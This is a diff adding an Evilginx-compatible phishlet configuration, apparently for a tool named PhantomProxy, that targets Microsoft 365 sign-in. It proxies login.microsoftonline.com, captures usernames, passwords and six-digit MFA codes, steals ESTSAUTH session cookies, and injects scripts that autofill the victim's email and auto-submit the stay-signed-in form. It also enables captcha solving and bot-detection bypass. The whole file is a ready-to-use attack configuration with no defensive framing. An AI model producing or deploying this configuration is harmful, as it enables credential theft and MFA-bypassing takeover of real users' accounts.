@@ -1,0 +1,149 @@
+# Microsoft 365 Phishlet для PhantomProxy
+# Совместим с Evilginx v2.3.0+
+
+author: '@phantom-proxy'
+min_ver: '1.0.0'
+
+# Хосты для проксирования
+proxy_hosts:
+  - phish_sub: ''
+    orig_sub: 'login'
+    domain: 'microsoftonline.com'
+    session: true
+    is_landing: true
+    auto_filter: true
+    
+  - phish_sub: 'api'
+    orig_sub: 'api'
+    domain: 'microsoft.com'
+    session: false
+    is_landing: false
+    
+  - phish_sub: 'www'
+    orig_sub: 'www'
+    domain: 'microsoft.com'
+    session: false
+    is_landing: false
+
+# Правила замены контента
+sub_filters:
+  - triggers_on: 'login.microsoftonline.com'
+    orig_sub: 'login'
+    domain: 'microsoftonline.com'
+    search: 'https://{hostname}/ppsecure/'
+    replace: 'https://{hostname}/ppsecure/'
+    mimes: ['text/html', 'application/json', 'application/javascript']
+    
+  - triggers_on: 'login.microsoftonline.com'
+    orig_sub: 'login'
+    domain: 'microsoftonline.com'
+    search: 'https://{hostname}'
+    replace: 'https://{hostname}'
+    mimes: ['text/html']
+    redirect_only: true
+
+# Токены аутентификации для перехвата
+auth_tokens:
+  - domain: '.microsoftonline.com'
+    keys:
+      - 'ESTSAUTH'
+      - 'ESTSAUTHPERSISTENT'
+      - 'SignInCookies'
+      
+  - domain: '.microsoft.com'
+    keys:
+      - 'MSOAuth'
+      - 'msapp'
+
+# Конфигурация перехвата креденшалов
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'mfa_code'
+      search: '([0-9]{6})'
+      type: 'post'
+
+# URLs успешной аутентификации
+auth_urls:
+  - '/common/oauth2/v2.0/authorize'
+  - '/common/oauth2/v2.0/token'
+  - '/kmsi'
+
+# Страница входа
+login:
+  domain: 'login.microsoftonline.com'
+  path: '/common/oauth2/v2.0/authorize'
+
+# JavaScript инъекции
+js_inject:
+  - trigger_domains:
+      - 'login.microsoftonline.com'
+    trigger_paths:
+      - '/common/oauth2/v2.0/authorize'
+    trigger_params:
+      - 'email'
+    script: |
+      (function() {
+        // Автозаполнение email
+        var emailField = document.querySelector('input[type="email"]');
+        if (emailField) {
+          emailField.value = "{email}";
+          emailField.dispatchEvent(new Event('input', { bubbles: true }));
+          
+          // Фокус на поле пароля после ввода email
+          emailField.addEventListener('blur', function() {
+            var passwordField = document.querySelector('input[type="password"]');
+            if (passwordField) {
+              passwordField.focus();
+            }
+          });
+        }
+        
+        // Скрытие индикаторов загрузки
+        var spinners = document.querySelectorAll('.spinner, .loading');
+        spinners.forEach(function(el) {
+          el.style.display = 'none';
+        });
+      })();
+
+  - trigger_domains:
+      - 'login.microsoftonline.com'
+    trigger_paths:
+      - '/kmsi'
+    trigger_params: []
+    script: |
+      (function() {
+        // Авто-отправка формы KMSI (Keep Me Signed In)
+        var kmsiForm = document.querySelector('form[name="kmsiForm"]');
+        if (kmsiForm) {
+          setTimeout(function() {
+            kmsiForm.submit();
+          }, 500);
+        }
+      })();
+
+# Принудительные POST параметры
+force_post:
+  - path: '/common/oauth2/v2.0/token'
+    search:
+      - key: 'username'
+        search: '.*'
+      - key: 'password'
+        search: '.*'
+    force:
+      - key: 'rememberMe'
+        value: 'true'
+    type: 'post'
+
+# Обход защит
+evasion:
+  captcha_solver: 'playwright'
+  bot_detection_bypass: true
+  fingerprint_override: 'chrome_133'
